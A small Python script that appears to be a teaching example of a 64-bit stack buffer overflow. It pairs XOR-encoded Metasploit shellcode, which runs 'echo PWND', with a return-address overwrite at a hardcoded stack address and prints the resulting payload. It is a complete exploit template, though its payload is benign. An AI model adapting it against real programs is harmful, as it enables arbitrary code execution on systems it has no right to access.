#!/usr/bin/env python
#
# Simple 64 bits b0f example
# Little and cute.
#

offset_to_eip = 136

# msfpayload linux/x64/exec CMD="echo PWND" R | msfencode -b '\x00' -e x64/xor -t c
# [*] x64/xor succeeded with size 95 (iteration=1)

shellcode = (
"\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xc5\xb6\x57\xcc\xbf\x7a\x60\xc7\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xaf\x8d\x0f\x55\xf7\xc1"
"\x4f\xa5\xac\xd8\x78\xbf\xd7\x7a\x33\x8f\x4c\x51\x3f\xe1\xdc"
"\x7a\x60\x8f\x4c\x50\x05\x24\xb5\x7a\x60\xc7\xa0\xd5\x3f\xa3"
"\x9f\x2a\x37\x89\x81\xb6\x01\x9b\xf7\xf3\x86\xc8\xc0\xb6\x57"
"\xcc\xbf\x7a\x60\xc7")

# jmp to shellcode at 0x7fffffffdbb0
# Note I only write six bytes. The two leading 0x00 bytes
# (64 bit address) are already on the stack.
eip = "\xb0\xdb\xff\xff\xff\x7f"

string = shellcode + ("\x24\xFF" * 20) + "\x90" + eip # hardcoded, nasty

print string
